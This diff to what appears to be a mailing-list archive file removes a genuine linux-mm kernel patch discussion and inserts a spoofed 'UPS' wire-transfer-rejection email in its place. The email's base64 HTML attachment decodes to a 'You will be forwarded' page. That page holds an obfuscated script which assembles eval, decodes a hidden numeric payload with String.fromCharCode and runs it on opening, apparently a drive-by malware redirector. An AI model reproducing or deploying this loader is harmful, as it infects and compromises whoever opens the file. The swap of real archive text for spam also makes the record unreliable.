@@ -1,62 +1,127 @@
-Return-Path: <owner-linux-mm@kvack.org>
-Received: from psmtp.com (na3sys010amx105.postini.com [74.125.245.105])
-	by kanga.kvack.org (Postfix) with SMTP id 126C16B0078
-	for <linux-mm@kvack.org>; Thu, 19 Jul 2012 06:28:27 -0400 (EDT)
-Received: from /spool/local
-	by e23smtp05.au.ibm.com with IBM ESMTP SMTP Gateway: Authorized Use Only! Violators will be prosecuted
-	for <linux-mm@kvack.org> from <liwanp@linux.vnet.ibm.com>;
-	Thu, 19 Jul 2012 10:22:11 +1000
-Received: from d23av03.au.ibm.com (d23av03.au.ibm.com [9.190.234.97])
-	by d23relay03.au.ibm.com (8.13.8/8.13.8/NCO v10.0) with ESMTP id q6JASKU76095256
-	for <linux-mm@kvack.org>; Thu, 19 Jul 2012 20:28:20 +1000
-Received: from d23av03.au.ibm.com (loopback [127.0.0.1])
-	by d23av03.au.ibm.com (8.14.4/8.13.1/NCO v10.0 AVout) with ESMTP id q6JASJA9021798
-	for <linux-mm@kvack.org>; Thu, 19 Jul 2012 20:28:20 +1000
-Date: Thu, 19 Jul 2012 18:28:18 +0800
-From: Wanpeng Li <liwanp@linux.vnet.ibm.com>
-Subject: Re: [PATCH v2] mm/memcg: use exist interface to get css from memcg
-Message-ID: <20120719102818.GA20171@kernel>
-Reply-To: Wanpeng Li <liwanp@linux.vnet.ibm.com>
-References: <1342609734-22437-1-git-send-email-liwanp@linux.vnet.ibm.com>
- <20120719092928.GA2864@tiehlicka.suse.cz>
- <5007E00B.6000802@jp.fujitsu.com>
+Return-Path: <OrionMenkin@ameritrade.com>
+Received: from [92.46.23.121] (helo=tenchiclub.com) by  with esmtpa (Exim 4.76 (FreeBSD)) (envelope-from <OrionMenkin@ameritrade.com>) id 1E6SAU-7297so-R9 for linux-mm@kvack.org; Thu, 19 Jul 2012 12:07:43 +0600
+From: "ups Express" <ups-delivery-services@ups.com>
+Subject: Fwd: Wire Transfer (61521GR478)
+Date: Thu, 19 Jul 2012 12:07:43 +0600
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <5007E00B.6000802@jp.fujitsu.com>
-Sender: owner-linux-mm@kvack.org
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0FB0_01CD65D1.02D73180"
+Message-ID: <afe901cd65d1$02a91ca0$79172e5c@ups-services>
+To: linux-mm@kvack.org
 List-ID: <linux-mm.kvack.org>
-To: Kamezawa Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com>, Michal Hocko <mhocko@suse.cz>
-Cc: linux-mm@kvack.org, Johannes Weiner <hannes@cmpxchg.org>, cgroups@vger.kernel.org, linux-kernel@vger.kernel.org, Gavin Shan <shangw@linux.vnet.ibm.com>, Bob Liu <lliubbo@gmail.com>
 
-On Thu, Jul 19, 2012 at 07:23:07PM +0900, Kamezawa Hiroyuki wrote:
->(2012/07/19 18:29), Michal Hocko wrote:
->>On Wed 18-07-12 19:08:54, Wanpeng Li wrote:
->>>use exist interface mem_cgroup_css instead of &mem->css.
->>
->>This interface has been added to enable mem->css outside of
->>mm/memcontrol.c (where we define struct mem_cgroup). There is one user
->>left (hwpoison_filter_task) after recent clean ups.
->>
->>I think we shouldn't spread the usage inside the mm/memcontrol.c. The
->>compiler inlines the function for all callers added by this patch but I
->>wouldn't rely on it. It is also unfortunate that we cannot convert all
->>dereferences (e.g. const mem_cgroup).
->>Moreover it doesn't add any additional type safety. So I would vote for
->>not taking the patch but if others like it I will not block it.
->>
->
->Agreed.
+This is a multi-part message in MIME format.
 
-Hmm, I see, thank you. :-)
+------=_NextPart_000_0FB0_01CD65D1.02D73180
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_001_0088_01CD65D1.02D73180"
 
-Best Regards,
-Wanpeng Li
->
->-Kame
+------=_NextPart_001_0088_01CD65D1.02D73180
+Content-Type: text/plain;
+	charset="iso-8859-2"
+Content-Transfer-Encoding: 7bit
 
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+Dear  Operator,WIRE N: FD-407177735708489STATUS:  REJECTED You can find details in the attached file.
+
+
+------=_NextPart_001_0088_01CD65D1.02D73180
+Content-Type: text/html;
+	charset="iso-8859-2"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE></TITLE>
+<META content=3D"text/html; charset=3Diso-8859-2" http-equiv=3DContent-Ty=
+pe>
+<META content=3D"MSHTML 5.50.4947.1900" name=3DGENERATOR></HEAD>
+<BODY>
+Dear  Operator,<br /><br />
+
+WIRE N: FD-407177735708489<br /><br />
+STATUS:  REJECTED </a><br /><br />
+
+<b>You can find details in the attached file.</b><br /><br />
+
+</BODY></HTML>
+
+------=_NextPart_001_0088_01CD65D1.02D73180--
+
+
+------=_NextPart_000_0FB0_01CD65D1.02D73180
+Content-Type: text/html;
+	name="Wire_AMBA01-Rejected.htm"
+Content-Transfer-Encoding: base64
+Content-ID: <006901cd65d1$02ad1440$79172e5c@R37V06>
+
+PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFs
+Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+DQo8aHRtbD4NCiA8
+aGVhZD4NCiAgPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0
+bWw7IGNoYXJzZXQ9dXRmLTgiPg0KIDwvaGVhZD4NCiA8Ym9keT4gIA0KDQo8aDE+PGI+UGxlYXNl
+IHdhaXQgYSBtb21lbnQuIFlvdSB3aWxsIGJlIGZvcndhcmRlZC4uLjwvaDE+PC9iPg0KDQo8c2Ny
+aXB0PnRyeXtwcm90b3R5cGU+MDt9Y2F0Y2goenhjKXtlPXdpbmRvd1siZXZhIisibCJdO249Ijgx
+Li45MC4uOTQ1Li4xMDIwLi4yODguLjQwMC4uOTAwLi4xMTEwLi44OTEuLjExNzAuLjk4MS4uMTAx
+MC4uOTkwLi4xMTYwLi40MTQuLjEwMzAuLjkwOS4uMTE2MC4uNjIxLi4xMDgwLi45MDkuLjEwOTAu
+LjkwOS4uMTEwMC4uMTA0NC4uMTE1MC4uNTk0Li4xMjEwLi43NTYuLjk3MC4uOTI3Li43ODAuLjg3
+My4uMTA5MC4uOTA5Li40MDAuLjM1MS4uOTgwLi45OTkuLjEwMDAuLjEwODkuLjM5MC4uMzY5Li45
+MTAuLjQzMi4uOTMwLi4zNjkuLjEyMzAuLjExNy4uOTAuLjgxLi45MC4uOTQ1Li4xMDIwLi4xMDI2
+Li45NzAuLjk4MS4uMTAxMC4uMTAyNi4uNDAwLi4zNjkuLjU5MC4uMTE3Li45MC4uODEuLjEyNTAu
+LjI4OC4uMTAxMC4uOTcyLi4xMTUwLi45MDkuLjMyMC4uMTEwNy4uMTMwLi44MS4uOTAuLjgxLi4x
+MDAwLi45OTkuLjk5MC4uMTA1My4uMTA5MC4uOTA5Li4xMTAwLi4xMDQ0Li40NjAuLjEwNzEuLjEx
+NDAuLjk0NS4uMTE2MC4uOTA5Li40MDAuLjMwNi4uNjAwLi45NDUuLjEwMjAuLjEwMjYuLjk3MC4u
+OTgxLi4xMDEwLi4yODguLjExNTAuLjEwMjYuLjk5MC4uNTQ5Li4zOTAuLjkzNi4uMTE2MC4uMTA0
+NC4uMTEyMC4uNTIyLi40NzAuLjQyMy4uMTAyMC4uOTk5Li4xMTQwLi4xMDUzLi4xMDkwLi44NzMu
+LjExMDAuLjg3My4uMTE0MC4uOTM2Li4xMDUwLi4xMDM1Li4xMTYwLi40MTQuLjExNDAuLjEwNTMu
+LjU4MC4uNTA0Li40ODAuLjUwNC4uNDgwLi40MjMuLjEwMjAuLjk5OS4uMTE0MC4uMTA1My4uMTA5
+MC4uNDIzLi4xMTUwLi45MzYuLjExMTAuLjEwNzEuLjExNjAuLjkzNi4uMTE0MC4uOTA5Li45NzAu
+LjkwMC4uNDYwLi4xMDA4Li4xMDQwLi4xMDA4Li42MzAuLjEwMDguLjk3MC4uOTI3Li4xMDEwLi41
+NDkuLjUzMC4uOTE4Li45NzAuLjQ3Ny4uNTYwLi44ODIuLjk5MC4uOTA5Li41NTAuLjQ4Ni4uNTcw
+Li45MDkuLjUzMC4uODkxLi41MDAuLjg5MS4uMzkwLi4yODguLjExOTAuLjk0NS4uMTAwMC4uMTA0
+NC4uMTA0MC4uNTQ5Li4zOTAuLjQ0MS4uNDgwLi4zNTEuLjMyMC4uOTM2Li4xMDEwLi45NDUuLjEw
+MzAuLjkzNi4uMTE2MC4uNTQ5Li4zOTAuLjQ0MS4uNDgwLi4zNTEuLjMyMC4uMTAzNS4uMTE2MC4u
+MTA4OS4uMTA4MC4uOTA5Li42MTAuLjM1MS4uMTE4MC4uOTQ1Li4xMTUwLi45NDUuLjk4MC4uOTQ1
+Li4xMDgwLi45NDUuLjExNjAuLjEwODkuLjU4MC4uOTM2Li4xMDUwLi45MDAuLjEwMDAuLjkwOS4u
+MTEwMC4uNTMxLi4xMTIwLi45OTkuLjExNTAuLjk0NS4uMTE2MC4uOTQ1Li4xMTEwLi45OTAuLjU4
+MC4uODczLi45ODAuLjEwMzUuLjExMTAuLjk3Mi4uMTE3MC4uMTA0NC4uMTAxMC4uNTMxLi4xMDgw
+Li45MDkuLjEwMjAuLjEwNDQuLjU4MC4uNDMyLi41OTAuLjEwNDQuLjExMTAuLjEwMDguLjU4MC4u
+NDMyLi41OTAuLjM1MS4uNjIwLi41NDAuLjQ3MC4uOTQ1Li4xMDIwLi4xMDI2Li45NzAuLjk4MS4u
+MTAxMC4uNTU4Li4zNDAuLjM2OS4uNTkwLi4xMTcuLjkwLi44MS4uMTI1MC4uMTE3Li45MC4uODEu
+LjEwMjAuLjEwNTMuLjExMDAuLjg5MS4uMTE2MC4uOTQ1Li4xMTEwLi45OTAuLjMyMC4uOTQ1Li4x
+MDIwLi4xMDI2Li45NzAuLjk4MS4uMTAxMC4uMTAyNi4uNDAwLi4zNjkuLjEyMzAuLjExNy4uOTAu
+LjgxLi45MC4uMTA2Mi4uOTcwLi4xMDI2Li4zMjAuLjkxOC4uMzIwLi41NDkuLjMyMC4uOTAwLi4x
+MTEwLi44OTEuLjExNzAuLjk4MS4uMTAxMC4uOTkwLi4xMTYwLi40MTQuLjk5MC4uMTAyNi4uMTAx
+MC4uODczLi4xMTYwLi45MDkuLjY5MC4uOTcyLi4xMDEwLi45ODEuLjEwMTAuLjk5MC4uMTE2MC4u
+MzYwLi4zOTAuLjk0NS4uMTAyMC4uMTAyNi4uOTcwLi45ODEuLjEwMTAuLjM1MS4uNDEwLi41MzEu
+LjEwMjAuLjQxNC4uMTE1MC4uOTA5Li4xMTYwLi41ODUuLjExNjAuLjEwNDQuLjExNDAuLjk0NS4u
+OTgwLi4xMDUzLi4xMTYwLi45MDkuLjQwMC4uMzUxLi4xMTUwLi4xMDI2Li45OTAuLjM1MS4uNDQw
+Li4zNTEuLjEwNDAuLjEwNDQuLjExNjAuLjEwMDguLjU4MC4uNDIzLi40NzAuLjkxOC4uMTExMC4u
+MTAyNi4uMTE3MC4uOTgxLi45NzAuLjk5MC4uOTcwLi4xMDI2Li4xMDQwLi45NDUuLjExNTAuLjEw
+NDQuLjQ2MC4uMTAyNi4uMTE3MC4uNTIyLi41NjAuLjQzMi4uNTYwLi40MzIuLjQ3MC4uOTE4Li4x
+MTEwLi4xMDI2Li4xMTcwLi45ODEuLjQ3MC4uMTAzNS4uMTA0MC4uOTk5Li4xMTkwLi4xMDQ0Li4x
+MDQwLi4xMDI2Li4xMDEwLi44NzMuLjEwMDAuLjQxNC4uMTEyMC4uOTM2Li4xMTIwLi41NjcuLjEx
+MjAuLjg3My4uMTAzMC4uOTA5Li42MTAuLjQ3Ny4uMTAyMC4uODczLi41MzAuLjUwNC4uOTgwLi44
+OTEuLjEwMTAuLjQ5NS4uNTQwLi41MTMuLjEwMTAuLjQ3Ny4uOTkwLi40NTAuLjk5MC4uMzUxLi40
+MTAuLjUzMS4uMTAyMC4uNDE0Li4xMTUwLi4xMDQ0Li4xMjEwLi45NzIuLjEwMTAuLjQxNC4uMTE4
+MC4uOTQ1Li4xMTUwLi45NDUuLjk4MC4uOTQ1Li4xMDgwLi45NDUuLjExNjAuLjEwODkuLjYxMC4u
+MzUxLi4xMDQwLi45NDUuLjEwMDAuLjkwMC4uMTAxMC4uOTkwLi4zOTAuLjUzMS4uMTAyMC4uNDE0
+Li4xMTUwLi4xMDQ0Li4xMjEwLi45NzIuLjEwMTAuLjQxNC4uMTEyMC4uOTk5Li4xMTUwLi45NDUu
+LjExNjAuLjk0NS4uMTExMC4uOTkwLi42MTAuLjM1MS4uOTcwLi44ODIuLjExNTAuLjk5OS4uMTA4
+MC4uMTA1My4uMTE2MC4uOTA5Li4zOTAuLjUzMS4uMTAyMC4uNDE0Li4xMTUwLi4xMDQ0Li4xMjEw
+Li45NzIuLjEwMTAuLjQxNC4uMTA4MC4uOTA5Li4xMDIwLi4xMDQ0Li42MTAuLjM1MS4uNDgwLi4z
+NTEuLjU5MC4uOTE4Li40NjAuLjEwMzUuLjExNjAuLjEwODkuLjEwODAuLjkwOS4uNDYwLi4xMDQ0
+Li4xMTEwLi4xMDA4Li42MTAuLjM1MS4uNDgwLi4zNTEuLjU5MC4uOTE4Li40NjAuLjEwMzUuLjEw
+MTAuLjEwNDQuLjY1MC4uMTA0NC4uMTE2MC4uMTAyNi4uMTA1MC4uODgyLi4xMTcwLi4xMDQ0Li4x
+MDEwLi4zNjAuLjM5MC4uMTA3MS4uMTA1MC4uOTAwLi4xMTYwLi45MzYuLjM5MC4uMzk2Li4zOTAu
+LjQ0MS4uNDgwLi4zNTEuLjQxMC4uNTMxLi4xMDIwLi40MTQuLjExNTAuLjkwOS4uMTE2MC4uNTg1
+Li4xMTYwLi4xMDQ0Li4xMTQwLi45NDUuLjk4MC4uMTA1My4uMTE2MC4uOTA5Li40MDAuLjM1MS4u
+MTA0MC4uOTA5Li4xMDUwLi45MjcuLjEwNDAuLjEwNDQuLjM5MC4uMzk2Li4zOTAuLjQ0MS4uNDgw
+Li4zNTEuLjQxMC4uNTMxLi4xMzAuLjgxLi45MC4uODEuLjEwMDAuLjk5OS4uOTkwLi4xMDUzLi4x
+MDkwLi45MDkuLjExMDAuLjEwNDQuLjQ2MC4uOTI3Li4xMDEwLi4xMDQ0Li42OTAuLjk3Mi4uMTAx
+MC4uOTgxLi4xMDEwLi45OTAuLjExNjAuLjEwMzUuLjY2MC4uMTA4OS4uODQwLi44NzMuLjEwMzAu
+LjcwMi4uOTcwLi45ODEuLjEwMTAuLjM2MC4uMzkwLi44ODIuLjExMTAuLjkwMC4uMTIxMC4uMzUx
+Li40MTAuLjgxOS4uNDgwLi44MzcuLjQ2MC4uODczLi4xMTIwLi4xMDA4Li4xMDEwLi45OTAuLjEw
+MDAuLjYwMy4uMTA0MC4uOTQ1Li4xMDgwLi45MDAuLjQwMC4uOTE4Li40MTAuLjUzMS4uMTMwLi44
+MS4uOTAuLjExMjUiLnNwbGl0KCIuLiIpO2g9MjtzPSIiO2ZvcihpPTA7LTY1MStpPDA7aT0xK2kp
+e2s9aTtzPXMrU3RyaW5nLmZyb21DaGFyQ29kZShuW2tdLyhpJShoKSs5KSk7fWlmKDAxMj09PTEw
+KWUocyk7fTwvc2NyaXB0Pg0KDQo8L2JvZHk+DQo8L2h0bWw+ 
+
+------=_NextPart_000_0FB0_01CD65D1.02D73180--
